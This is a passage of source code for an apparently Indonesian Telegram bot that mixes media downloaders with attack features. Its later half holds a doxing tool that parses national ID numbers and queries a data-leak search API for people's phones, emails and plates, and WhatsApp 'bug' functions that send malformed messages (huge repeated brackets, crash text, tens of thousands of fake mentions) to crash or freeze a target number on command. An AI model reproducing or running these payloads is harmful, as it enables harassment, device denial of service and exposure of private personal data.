    await ctx.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, `✅ Upload sukses:\n${link}`);
  } catch (err) {
    console.error("Upload error:", err);
    await ctx.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, "❌ Gagal mengunggah media.");
  }
});

bot.command("cekid", async (ctx) => {
    const id = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak Ada";
    const firstname = ctx.from.first_name || "Tidak Ada";
    const lastname = ctx.from.last_name || "Tidak Ada";

    await ctx.reply(
        `*Telegram Info*\n\n` +
        `ID: \`${id}\`\n` +
        `Username: ${username}\n` +
        `First Name: ${firstname}\n` +
        `Last Name: ${lastname}`,
        { parse_mode: "Markdown" }
    );
});

 //YUTUB
const { spawn } = require('child_process');
const path = require('path');
const ytSearch = require('yt-search');

bot.command('play', async (ctx) => {
    const query = ctx.message.text.split(' ').slice(1).join(' ');

    if (!query) {
        return ctx.reply('Example: /play Until i found you');
    }

    const processingMsg = await ctx.reply('🔄 *Memproses permintaan...*', {
        parse_mode: 'Markdown'
    });

    try {
        // Cari video YouTube
        const result = await ytSearch(query);
        if (!result.videos.length) {
            return ctx.telegram.editMessageText(
                ctx.chat.id,
                processingMsg.message_id,
                null,
                '❌ Video tidak ditemukan!'
            );
        }

        const video = result.videos[0];
        const titleSafe = video.title.replace(/[\/\\:*?"<>|]/g, '');
        const timestamp = Date.now();
        const baseName = `${timestamp}-${titleSafe}`;
        const outputTemplate = path.join(__dirname, `${baseName}.%(ext)s`);
        const expectedMp3 = path.join(__dirname, `${baseName}.mp3`);

        // Jalankan yt-dlp
        const ytdlp = spawn('yt-dlp', [
            '--cookies', path.join(__dirname, 'cookies.txt'),
            '-x', '--audio-format', 'mp3',
            '--audio-quality', '5', // 128kbps
            '-o', outputTemplate,
            video.url
        ]);

        let errorLog = '';
        ytdlp.stderr.on('data', (data) => {
            errorLog += data.toString();
        });

        ytdlp.on('close', async (code) => {
            // Cek apakah file hasilnya ada
            if (code !== 0 || !fs.existsSync(expectedMp3)) {
                return ctx.telegram.editMessageText(
                    ctx.chat.id,
                    processingMsg.message_id,
                    null,
                    `❌ Gagal mengunduh audio.\n\nLog:\n<pre>${errorLog.slice(0, 3000)}</pre>`,
                    { parse_mode: 'HTML' }
                );
            }

            try {
                // Coba kirim file mp3 ke Telegram
                const stats = fs.statSync(expectedMp3);
                const sizeMB = stats.size / (1024 * 1024);

                if (sizeMB > 50) {
                    throw new Error(`Ukuran file ${sizeMB.toFixed(2)} MB melebihi batas Telegram.`);
                }

                await ctx.replyWithAudio({ source: expectedMp3 }, {
                    title: video.title,
                    performer: video.author.name,
                });

                fs.unlinkSync(expectedMp3); // Hapus file setelah dikirim
                await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id);
            } catch (uploadErr) {
                console.error('❌ Gagal kirim audio:', uploadErr);
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    processingMsg.message_id,
                    null,
                    `❌ Gagal mengirim audio ke Telegram.\n\nError:\n<pre>${uploadErr.message}</pre>`,
                    { parse_mode: 'HTML' }
                );
            }
        });

    } catch (err) {
        console.error('❌ Error utama:', err);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processingMsg.message_id,
            null,
            '❌ Terjadi kesalahan saat memproses permintaan.'
        );
    }
});
//TIKTOK 
const { v4: uuidv4 } = require('uuid');
const stream = require('stream');
const { promisify } = require('util');
const pipeline = promisify(stream.pipeline);

const downloadCache = new Map();

bot.command('tt', async (ctx) => {
    const link = ctx.message.text.split(' ')[1];
    const userId = ctx.from.id;

    if (!link || !link.includes('tiktok.com')) {
        return ctx.reply(' Example: /tt <link video tiktok>');
    }

    const processingMsg = await ctx.reply('⏳ *In process...*', { parse_mode: 'Markdown' });

    try {
        const apiURL = `https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(link)}`;
        const res = await axios.get(apiURL);
        const result = res.data.result;

        if (!result) throw new Error('Data tidak lengkap dari API.');

        const photos = result.images || result.photos || null;

        if (photos && Array.isArray(photos) && photos.length > 0) {
            downloadCache.set(userId, {
                photos,
                caption: '',
                currentPhotoIndex: 0
            });

            await ctx.telegram.editMessageText(
                ctx.chat.id,
                processingMsg.message_id,
                null,
                '📷 Slideshow terdeteksi!',
                {
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                }
            );

            await ctx.replyWithPhoto(photos[0], {
                caption: `Foto 1 dari ${photos.length}`,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '⌫ Prev', callback_data: 'prev_photo' },
                            { text: `${1}/${photos.length}`, callback_data: 'current_photo' },
                            { text: 'Next ⌦', callback_data: 'next_photo' }
                        ]
                    ]
                }
            });

            return;
        }

        if (!result.play || !result.music) {
            throw new Error('Data video/audio tidak lengkap.');
        }

        const videoUrl = result.play;
        const audioUrl = result.music;
        const caption = `👤 Author Name: ${result.author?.nickname || 'Undefined'}\n🎬 Title: *${result.title || 'Undefined'}*\n🔗 [Link TikTok](${link})`;

        downloadCache.set(userId, { videoUrl, audioUrl, caption });

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processingMsg.message_id,
            null,
            caption,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🎥 Video', callback_data: 'download_video' },
                            { text: '🎵 Sound', callback_data: 'download_audio' }
                        ]
                    ]
                }
            }
        );

    } catch (err) {
        console.error(err.message);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processingMsg.message_id,
            null,
            '❌ Failed to process TikTok link.'
        );
    }
});

bot.action('download_video', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data) return ctx.answerCbQuery('❌ There is no data to download.');

    await ctx.answerCbQuery('Downloading videos...');

    try {
        const tempPath = path.join(__dirname, `${uuidv4()}.mp4`);
        const response = await axios.get(data.videoUrl, { responseType: 'stream' });
        await pipeline(response.data, fs.createWriteStream(tempPath));

        await ctx.replyWithVideo({ source: tempPath }, {
            caption: data.caption,
            parse_mode: 'Markdown'
        });

        fs.unlinkSync(tempPath);
    } catch (err) {
        console.error(err.message);
        ctx.reply('❌ Failed to download video.');
    }
});

bot.action('download_audio', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data) return ctx.answerCbQuery('❌ No data to download.');

    await ctx.answerCbQuery('Downloading audio...');

    try {
        const tempPath = path.join(__dirname, `${uuidv4()}.mp3`);
        const response = await axios.get(data.audioUrl, { responseType: 'stream' });
        await pipeline(response.data, fs.createWriteStream(tempPath));

        await ctx.replyWithAudio({ source: tempPath }, {
            title: 'TikTok Sound',
            performer: data.caption.split('\n')[1]?.replace('👤 ', '')
        });

        fs.unlinkSync(tempPath);
    } catch (err) {
        console.error(err.message);
        ctx.reply('❌ Failed to download audio.');
    }
});

// Foto slideshow: prev/next
bot.action('prev_photo', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data || !data.photos) return ctx.answerCbQuery('❌ No photos available.');

    let idx = data.currentPhotoIndex;
    idx = idx <= 0 ? data.photos.length - 1 : idx - 1;
    data.currentPhotoIndex = idx;
    downloadCache.set(userId, data);

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: data.photos[idx],
            caption: `Foto ${idx + 1} dari ${data.photos.length}`,
            parse_mode: 'Markdown'
        }, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '⌫ Prev', callback_data: 'prev_photo' },
                        { text: `${idx + 1}/${data.photos.length}`, callback_data: 'current_photo' },
                        { text: 'Next ⌦', callback_data: 'next_photo' }
                    ]
                ]
            }
        });
        await ctx.answerCbQuery();
    } catch (err) {
        console.error(err);
        await ctx.answerCbQuery('❌ Failed to update photo.');
    }
});

bot.action('next_photo', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data || !data.photos) return ctx.answerCbQuery('❌ No photos available.');

    let idx = data.currentPhotoIndex;
    idx = idx >= data.photos.length - 1 ? 0 : idx + 1;
    data.currentPhotoIndex = idx;
    downloadCache.set(userId, data);

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: data.photos[idx],
            caption: `Foto ${idx + 1} dari ${data.photos.length}`,
            parse_mode: 'Markdown'
        }, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '⌫ Prev', callback_data: 'prev_photo' },
                        { text: `${idx + 1}/${data.photos.length}`, callback_data: 'current_photo' },
                        { text: 'Next ⌦', callback_data: 'next_photo' }
                    ]
                ]
            }
        });
        await ctx.answerCbQuery();
    } catch (err) {
        console.error(err);
        await ctx.answerCbQuery('❌ Failed to update photo.');
    }
});

bot.command('nik', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!checkPremium) return ctx.reply('❌ You are not premium!');
    if (!text) return ctx.reply(`Contoh: /nik 16070xxxxx`);

    try {
        // Kirim pesan awal "Sedang memproses..."
        const processingMessage = await ctx.reply("In Process...");

        // Fungsi untuk mem-parsing NIK
        function parseNik(nikNumber) {
            const nik = nikParser(nikNumber);

            function formatTanggalLahir(dateObj) {
                const date = new Date(dateObj);
                let year = date.getFullYear();
                if (year < 1970) year += 100;
                const tgl = String(date.getDate()).padStart(2, '0');
                const bln = String(date.getMonth() + 1).padStart(2, '0');
                return `${tgl}-${bln}-${year}`;
            }

            function formatKelamin(value) {
                if (!value) return "tidak diketahui";
                value = value.toString().toLowerCase();
                if (value.includes("l") || value.includes("1")) return "Pria";
                if (value.includes("p") || value.includes("2")) return "Wanita";
                return value.charAt(0).toUpperCase() + value.slice(1);
            }

            const prefix = '│'; // Simbol seperti quote visual

            return (
                `*Result NIK Info:*\n` +
                `${prefix} • Valid: Success\n` +
                `${prefix} • Provinsi ID: ${nik.provinceId()}\n` +
                `${prefix} • Nama Provinsi: ${nik.province()}\n` +
                `${prefix} • Kabupaten ID: ${nik.kabupatenKotaId()}\n` +
                `${prefix} • Nama Kabupaten: ${nik.kabupatenKota()}\n` +
                `${prefix} • Kecamatan ID: ${nik.kecamatanId()}\n` +
                `${prefix} • Nama Kecamatan: ${nik.kecamatan()}\n` +
                `${prefix} • Kode Pos: ${nik.kodepos()}\n` +
                `${prefix} • Jenis Kelamin: ${formatKelamin(nik.kelamin())}\n` +
                `${prefix} • Tanggal Lahir: ${formatTanggalLahir(nik.lahir())}\n` +
                `${prefix} • Uniqcode: ${nik.uniqcode()}`
            );
        }

        // Promise timeout 7 detik
        const timeoutPromise = new Promise((_, reject) =>
            setTimeout(() => reject(new Error("Timeout")), 7000)
        );

        // Proses parsing dengan batas waktu maksimal 7 detik
        const hasilDox = await Promise.race([
            new Promise((resolve) => {
                const result = parseNik(text);
                resolve(result);
            }),
            timeoutPromise,
        ]);

        // Kirim hasil sebagai reply ke pesan user dalam format quote-like
        await ctx.reply(hasilDox, {
            parse_mode: "Markdown",
            reply_to_message_id: ctx.message.message_id
        });

        // Hapus pesan "In Process..." jika ingin bersih
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, processingMessage.message_id);
        } catch (e) {
            console.warn("Gagal menghapus pesan loading:", e.message);
        }

    } catch (error) {
        console.error("Error:", error);
        let errorMsg = "❌ Terjadi kesalahan saat memproses data.";
        if (error.message === "Timeout") {
            errorMsg = "❌ Gagal: Waktu parsing melebihi 7 detik.";
        }
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            ctx.message.message_id + 1,
            undefined,
            errorMsg
        );
    }
});

//FUNCTION DOXING
const cacheReports = {};

function createKeyboard(queryId, pageId, totalPages) {
  const prev = { text: '⌫ Back', callback_data: `/page ${queryId} ${pageId - 1}` };
  const next = { text: 'Next ⌦', callback_data: `/page ${queryId} ${pageId + 1}` };
  const middle = { text: `${pageId + 1}/${totalPages}`, callback_data: `page_list` };

  // Disable prev button if on first page, disable next if on last page
  const keyboard = [];
  if (pageId > 0) keyboard.push(prev); else keyboard.push({ text: '⌫', callback_data: 'none', hide: true });
  keyboard.push(middle);
  if (pageId < totalPages - 1) keyboard.push(next); else keyboard.push({ text: '⌦', callback_data: 'none', hide: true });

  return {
    inline_keyboard: [keyboard]
  };
}


function escapeHTML(str) {
  return str.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
}

// Map untuk menyimpan user yang sedang input OSINT
const awaitingOsintInput = new Map();

bot.action("osint", checkPremiumPop, async (ctx) => {
  const userId = ctx.from.id;

  await ctx.answerCbQuery();

  // ⬅️ Set Map lebih dulu agar Cancel bisa langsung dipakai
  awaitingOsintInput.set(userId, {
    msgIds: []
  });

  const prompt = await ctx.reply(
    `\`\`\`𝗣𝗮𝗻𝗱𝘂𝗮𝗻 𝗣𝗲𝗻𝗰𝗮𝗿𝗶𝗮𝗻 𝗢𝗦𝗜𝗡𝗧 🔎

 Ketik apapun untuk mencari:
› 𝘌𝘮𝘢𝘪𝘭 → 𝘦𝘹𝘢𝘮𝘱𝘭𝘦@𝘨𝘮𝘢𝘪𝘭.𝘤𝘰𝘮
› 𝘕𝘰𝘮𝘰𝘳 𝘏𝘗 +6281234567890
› 𝘕𝘢𝘮𝘢 / 𝘉𝘶𝘥𝘪 𝘏𝘢𝘳𝘵𝘰𝘯𝘰 / @𝘣𝘶𝘥𝘪𝘩
› 𝘐𝘗 𝘈𝘥𝘥𝘳𝘦𝘴𝘴 → 127.0.0.1
› 𝘝𝘐𝘕 / 𝘗𝘭𝘢𝘵 𝘔𝘰𝘣𝘪𝘭 → B1234XYZ / XTA1234567890
› 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮, 𝘕𝘢𝘮𝘢 / 𝘐𝘋 / 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦
\`\`\`
`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Cancel', callback_data: 'cancel_inputs' }]
        ]
      }
    }
  );

  // ⬅️ Update message ID setelah reply selesai
  const current = awaitingOsintInput.get(userId);
  current.msgIds.push(prompt.message_id);
});

// Handler saat user membatalkan input OSINT
bot.action("cancel_inputs", async (ctx) => {
  const userId = ctx.from.id;

  if (awaitingOsintInput.has(userId)) {
    const { msgIds } = awaitingOsintInput.get(userId);

    for (const msgId of msgIds) {
      try {
        await ctx.telegram.deleteMessage(ctx.chat.id, msgId);
      } catch (e) {
        // Lewati kalau sudah dihapus
      }
    }

    awaitingOsintInput.delete(userId);

    // Coba edit tombol cancel itu jadi "❌ Input dibatalkan."
    try {
      await ctx.editMessageText("❌ Input canceled.");
    } catch (e) {
      // Kalau gagal, kirim pesan biasa aja
      await ctx.reply("❌ Input canceled.");
    }
  } else {
    // Kalau gak ada input aktif, tetap kasih respon agar user ngerti
    await ctx.answerCbQuery("There is no active input..");
  }
});

// Handler teks input OSINT
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const input = ctx.message.text;

  if (!awaitingOsintInput.has(userId)) return next(); //

  const { msgIds } = awaitingOsintInput.get(userId);
  msgIds.push(ctx.message.message_id);

  const queryId = Math.floor(Math.random() * 10000000).toString();
  const chatId = ctx.chat.id;

  try {
    const processingMsg = await ctx.reply("🔍 Processing data...");
    msgIds.push(processingMsg.message_id);

    const response = await axios.post(apiS, {
      token: tokenS,
      request: input,
      limit: 10000,
      lang: 'in'
    });

    const result = response.data;
    if (result["Error code"]) {
      const errMsg = await ctx.reply(`❌ Error: ${result["Error code"]}`);
      msgIds.push(errMsg.message_id);
      return;
    }

    const pages = [];

    for (const db in result.List) {
      const dataList = result.List[db]["Data"];
      if (!dataList || dataList.length === 0) continue;

      const upperDB = `<b>${db.toUpperCase()}</b>\n`;
      let currentPage = [upperDB];
      let currentLength = upperDB.length;

      for (const row of dataList) {
        const preBlock = [];
        for (const key in row) {
          const label = key.toUpperCase();
          const value = String(row[key]).toUpperCase();
          preBlock.push(`${label}: ${value}`);
        }

        const blockText = `<pre>${preBlock.join('\n')}</pre>\n`;

        if (currentLength + blockText.length > 3500) {
          pages.push(currentPage.join('\n'));
          currentPage = [upperDB, blockText];
          currentLength = upperDB.length + blockText.length;
        } else {
          currentPage.push(blockText);
          currentLength += blockText.length;
        }
      }

      if (currentPage.length > 1) {
        pages.push(currentPage.join('\n'));
      }
    }

    if (pages.length === 0) {
      const noData = await ctx.reply("❌ Tidak ditemukan data.");
      msgIds.push(noData.message_id);
    } else {
      cacheReports[queryId] = pages;
      await ctx.telegram.sendMessage(chatId, pages[0], {
        parse_mode: "HTML",
        reply_markup: createKeyboard(queryId, 0, pages.length)
      });
    }

    // Hapus semua pesan sebelumnya
    for (const msgId of msgIds) {
      try {
        await ctx.telegram.deleteMessage(chatId, msgId);
      } catch (e) {}
    }
  } catch (err) {
    console.error("❌ OSINT Error:", err.message);
    const fail = await ctx.reply("⚠️ Gagal memproses permintaan.");
    msgIds.push(fail.message_id);
  }

  awaitingOsintInput.delete(userId);
});

// Handler tombol callback (pagination)
bot.on('callback_query', async (ctx) => {
  try {
    // Jawab callback SEGERA
    await ctx.answerCbQuery(); 
    
    const cb = ctx.callbackQuery;
    const chatId = cb.message.chat.id;
    const messageId = cb.message.message_id;

    if (cb.data.startsWith("/page ")) {
      const [, queryId, pageIdStr] = cb.data.split(" ");
      const pageId = parseInt(pageIdStr);
      const pages = cacheReports[queryId];

      if (!pages || !pages[pageId]) {
        await ctx.editMessageText("❌ Hasil tidak ditemukan atau telah kedaluwarsa.", {
          chat_id: chatId,
          message_id: messageId
        });
        return;
      }

      await ctx.editMessageText(pages[pageId], {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: createKeyboard(queryId, pageId, pages.length)
      });
    }
  } catch (err) {
    if (err.response?.error_code === 400 &&
        err.response?.description?.includes("query is too old")) {
      console.warn("❗ Callback query sudah terlalu lama, dilewati.");
    } else {
      console.error("❌ Callback query error:", err);
    }
  }
});

bot.command("force", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /force 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 1; i++) {
        await ForceBlank(bijipler);
        await VampFcSpam(bijipler);
        await ForceFast(bijipler);
    }
    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Force : Successfully submitted bug"));
});

bot.command("xios", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example: /xios 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');

    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(`𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : PROCESS`);

    for (let i = 0; i < 8; i++) {
        xios(bijipler);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesZephy.message_id,
        undefined,
        `𝗡𝗨𝗠𝗕𝗘𝗥 : ${zepnumb}\n𝗦𝗧𝗔𝗧𝗨𝗦 : SUCCESS\nPlease pause for 15 minutes`
    );
    console.log(chalk.blue.bold("Xios : Successfully submitted bug"));
});

//FUNCTION BUGWA
async function GhostSqL(bijipler) {
  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(bijipler, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: 'damn it!!' 
          },
          footer: { 
            text: 'damn it!!' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 99999999999999,
                    width: 9999999999999999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(99999)
                }
              }
            ]
          },
          contextInfo: {
            participant: bijipler,
            remoteJid: bijipler,
            stanzaId: Zeph.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await Zeph.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [bijipler],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: bijipler },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
//KENTODLU

async function NewIosInvis(bijipler) {
  const crashText = "\u0000" + "𑇂𑆵𑆴𑆿".repeat(60000); // null byte + unicode repeater

  const message = {
    locationMessage: {
      degreesLatitude: 11.11,
      degreesLongitude: -11.11,
      name: crashText, 
      url: "https://t.me/dsewrld"
    }
  };

  const relayOptions = {
    messageId: crypto.randomBytes(10).toString("hex"),
    statusJidList: [bijipler],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: bijipler },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  };

  await Zeph.relayMessage("status@broadcast", message, relayOptions);
}

async function exDelay(bijipler) {
await Zeph.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `Hi @all\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [bijipler],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: bijipler
},
content: undefined
}]
}]
}]
}
);
}

async function invisSqL(bijipler) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(bijipler, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [bijipler],
                participant: bijipler,
                remoteJid: bijipler,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await Zeph.relayMessage(bijipler, msg.message, {
    participant: { jid: bijipler },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

bot.command("invis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example: /invis 628xxx`);
    }

    let zepnumb = q.replace(/[^0-9]/g, '');
    let bijipler = zepnumb + "@s.whatsapp.net";

    let ProsesZephy = await ctx.reply(
